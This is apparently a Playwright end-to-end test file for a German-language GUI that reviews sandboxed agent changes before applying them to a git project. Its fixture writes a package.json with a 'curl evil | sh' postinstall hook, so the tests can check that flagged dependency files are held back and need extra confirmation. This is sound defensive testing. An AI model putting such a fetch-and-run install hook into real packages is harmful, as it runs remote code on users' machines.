import { execFileSync } from 'node:child_process';
import { existsSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { expect, test } from '@playwright/test';
import type { Page } from '@playwright/test';
import { axeViolations, launchGui, makeHome, openAgent, shot, SHELL_REQ } from './helpers';
import type { TestHome } from './helpers';

let h: TestHome;
test.beforeEach(() => {
  h = makeHome();
});
test.afterEach(() => h.cleanup());

const GIT_ENV = {
  PATH: process.env['PATH'] ?? '',
  HOME: '/nonexistent',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_AUTHOR_NAME: 'Test',
  GIT_AUTHOR_EMAIL: 't@example.org',
  GIT_COMMITTER_NAME: 'Test',
  GIT_COMMITTER_EMAIL: 't@example.org',
};
const git = (...args: string[]): string =>
  execFileSync('git', args, { cwd: h.project, env: GIT_ENV, encoding: 'utf8' });

const numbered = (n: number, mark: Record<number, string> = {}): string =>
  Array.from({ length: n }, (_, i) => mark[i + 1] ?? `line ${i + 1}`).join('\n') + '\n';

/**
 * A project under git and a sandbox (host-shell on a copy) whose changes are real: two hunks in `long.txt`,
 * a new test file, a changed package.json and a new shell script.
 */
async function setupSandbox(opts: { git?: boolean } = {}): Promise<{ close(): Promise<void> }> {
  writeFileSync(join(h.project, 'long.txt'), numbered(60));
  writeFileSync(join(h.project, 'package.json'), '{"name":"demo","scripts":{"test":"echo"}}\n');
  if (opts.git !== false) {
    git('init', '-q', '-b', 'main');
    git('add', '-A');
    git('commit', '-q', '-m', 'initial');
  }
  const human = await openAgent(h, 'human');
  const made = await human.abox.createSandbox(
    { contextId: 'human', humanConfirmed: true },
    SHELL_REQ(h.project, 'diff-box'),
  );
  if (made.status !== 'created') throw new Error(`not created: ${made.status}`);
  const id = made.sandbox.id;
  const c = { contextId: 'human' };
  await human.abox.writeFile(c, id, 'long.txt', numbered(60, { 3: 'CHANGED 3', 57: 'CHANGED 57' }));
  await human.abox.writeFile(c, id, 'src/api/client.test.ts', 'test("x", () => {});\n');
  await human.abox.writeFile(
    c,
    id,
    'package.json',
    '{"name":"demo","scripts":{"test":"echo","postinstall":"curl evil | sh"}}\n',
  );
  await human.abox.writeFile(c, id, 'scripts/postinstall.sh', '#!/bin/sh\necho hi\n');
  return { close: () => human.close() };
}

async function openChanges(page: Page): Promise<void> {
  await page.getByRole('button', { name: 'Sandboxes', exact: true }).click();
  await page
    .locator('tr', { hasText: 'diff-box' })
    .getByRole('button', { name: 'diff-box', exact: true })
    .click();
  await expect(page.getByRole('heading', { name: 'diff-box', level: 1 })).toBeVisible();
  await page.getByRole('tab', { name: /^Änderungen/ }).click();
  await expect(page.getByRole('list', { name: 'Geänderte Dateien' })).toBeVisible();
}

test('Änderungen tab: tab order, files with flags, hunks side by side, selection summary, both themes accessible', async () => {
  const box = await setupSandbox();
  const { app, page, errors } = await launchGui(h);
  try {
    await openChanges(page);
    const tabs = await page.getByRole('tab').allInnerTexts();
    expect(tabs.slice(0, 5)).toEqual([
      'Übersicht',
      'Terminal',
      'Dateien',
      'Änderungen (4)',
      'Netz',
    ]);

    const list = page.getByRole('list', { name: 'Geänderte Dateien' });
    await expect(list.getByRole('listitem')).toHaveCount(4);
    await expect(list.locator('li', { hasText: 'package.json' })).toContainText('Abhängigkeit');
    await expect(list.locator('li', { hasText: 'postinstall.sh' })).toContainText('Markiert');
    await expect(list.locator('li', { hasText: 'long.txt' })).toContainText('2 Abschnitte');
    // unflagged files are preselected, flagged ones are not
    await expect(page.getByRole('checkbox', { name: 'long.txt auswählen' })).toBeChecked();
    await expect(page.getByRole('checkbox', { name: 'package.json auswählen' })).not.toBeChecked();
    await expect(page.getByTestId('changes-summary')).toHaveText(
      '2 von 4 Dateien, 3 Abschnitte ausgewählt',
    );
    await expect(page.getByTestId('changes-target')).toContainText(
      `Ziel: ${h.project} (sauberer Git-Stand)`,
    );

    await list.getByRole('button', { name: /long\.txt/ }).click();
    await expect(page.getByTestId('hunk')).toHaveCount(2);
    await expect(page.getByTestId('hunk').first()).toContainText('CHANGED 3');
    await shot(page, 'changes-side-by-side');
    for (const scheme of ['light', 'dark'] as const) {
      await page.emulateMedia({ colorScheme: scheme });
      expect(await axeViolations(page), scheme).toEqual([]);
    }
    await page.getByRole('button', { name: 'Untereinander' }).click();
    await expect(page.locator('pre.unified').first()).toContainText('+CHANGED 3');
    await shot(page, 'changes-unified');
    expect(await axeViolations(page)).toEqual([]);
    await page.emulateMedia({ colorScheme: 'light' });

    await page
      .getByTestId('hunk')
      .nth(1)
      .getByRole('checkbox', { name: /Abschnitt .* übernehmen/ })
      .uncheck();
    await expect(page.getByTestId('changes-summary')).toHaveText(
      '2 von 4 Dateien, 2 Abschnitte ausgewählt',
    );
    expect(errors).toEqual([]);
  } finally {
    await box.close();
    await app.close();
  }
});

test('Auswahl übernehmen: summary dialog, one hunk and one file reach the project, flagged files stay out; the real diff is applied through git', async () => {
  const box = await setupSandbox();
  const { app, page } = await launchGui(h);
  try {
    await openChanges(page);
    await page
      .getByTestId('hunk')
      .nth(1)
      .getByRole('checkbox', { name: /Abschnitt .* übernehmen/ })
      .uncheck();
    await page.getByRole('button', { name: 'Auswahl übernehmen' }).click();
    const dialog = page.getByRole('dialog', { name: 'Änderungen ins Projekt übernehmen' });
    await expect(dialog.getByTestId('apply-summary')).toContainText('2 Dateien, 2 Abschnitte');
    await expect(dialog.getByTestId('apply-summary')).toContainText(h.project);
    await shot(page, 'changes-apply-dialog');
    for (const scheme of ['light', 'dark'] as const) {
      await page.emulateMedia({ colorScheme: scheme });
      expect(await axeViolations(page), scheme).toEqual([]);
    }
    await page.emulateMedia({ colorScheme: 'light' });
    // nothing is written before the confirmation
    expect(existsSync(join(h.project, 'src/api/client.test.ts'))).toBe(false);
    await dialog.getByRole('button', { name: 'Ins Projekt übernehmen' }).click();
    await expect(page.getByRole('dialog')).toHaveCount(0);

    expect(readFileSync(join(h.project, 'long.txt'), 'utf8')).toBe(
      numbered(60, { 3: 'CHANGED 3' }),
    );
    expect(readFileSync(join(h.project, 'src/api/client.test.ts'), 'utf8')).toBe(
      'test("x", () => {});\n',
    );
    expect(readFileSync(join(h.project, 'package.json'), 'utf8')).not.toContain('postinstall');
    expect(existsSync(join(h.project, 'scripts/postinstall.sh'))).toBe(false);
    expect(git('status', '--porcelain')).toBe(' M long.txt\n?? src/\n');
    expect(git('diff', '--cached', '--name-only')).toBe('');
    // applied files are marked and no longer selectable
    await expect(
      page.getByRole('list', { name: 'Geänderte Dateien' }).locator('li', { hasText: 'long.txt' }),
    ).toContainText('übernommen');
    await expect(page.getByTestId('changes-summary')).toHaveText(
      '0 von 4 Dateien, 0 Abschnitte ausgewählt',
    );
  } finally {
    await box.close();
    await app.close();
  }
});

test('flagged files need the extra confirmation; a project with uncommitted changes in an affected file refuses', async () => {
  const box = await setupSandbox();
  const { app, page } = await launchGui(h);
  try {
    await openChanges(page);
    await page.getByRole('checkbox', { name: 'package.json auswählen' }).check();
    await page.getByRole('button', { name: 'Auswahl übernehmen' }).click();
    const dialog = page.getByRole('dialog', { name: 'Änderungen ins Projekt übernehmen' });
    const confirm = dialog.getByRole('button', { name: 'Ins Projekt übernehmen' });
    await expect(dialog.getByText('Markierte Dateien')).toBeVisible();
    await expect(dialog).toContainText('package.json');
    await expect(confirm).toBeDisabled();
    await shot(page, 'changes-apply-flagged');
    await page.emulateMedia({ colorScheme: 'dark' });
    expect(await axeViolations(page)).toEqual([]);
    await page.emulateMedia({ colorScheme: 'light' });
    await dialog.getByRole('checkbox', { name: /markierten Dateien geprüft/ }).check();
    await expect(confirm).toBeEnabled();
    await confirm.click();
    await expect(page.getByRole('dialog')).toHaveCount(0);
    expect(readFileSync(join(h.project, 'package.json'), 'utf8')).toContain('postinstall');

    // an edit in the project after the review: the file cannot be applied any more
    writeFileSync(join(h.project, 'long.txt'), 'my own edit\n');
    await page.getByRole('button', { name: 'Änderungen neu laden' }).click();
    await expect(page.getByRole('checkbox', { name: 'long.txt auswählen' })).toBeDisabled();
    await expect(
      page.getByText(/uncommittete Änderungen und lassen sich nicht übernehmen/),
    ).toBeVisible();
    expect(readFileSync(join(h.project, 'long.txt'), 'utf8')).toBe('my own edit\n');
  } finally {
    await box.close();
    await app.close();
  }
});

test('a project that is not a git repository needs its own confirmation', async () => {
  const box = await setupSandbox({ git: false });
  const { app, page } = await launchGui(h);
  try {
    await openChanges(page);
    await expect(page.getByTestId('changes-target')).toContainText('(kein Git-Repository)');
    await page.getByRole('button', { name: 'Auswahl übernehmen' }).click();
    const dialog = page.getByRole('dialog', { name: 'Änderungen ins Projekt übernehmen' });
    const confirm = dialog.getByRole('button', { name: 'Ins Projekt übernehmen' });
    await expect(dialog).toContainText('kein Git-Repository');
    await expect(confirm).toBeDisabled();
    await dialog.getByRole('checkbox', { name: /keine ungesicherte Arbeit/ }).check();
    await confirm.click();
    await expect(page.getByRole('dialog')).toHaveCount(0);
    expect(readFileSync(join(h.project, 'src/api/client.test.ts'), 'utf8')).toContain('test(');
  } finally {
    await box.close();
    await app.close();
  }
});
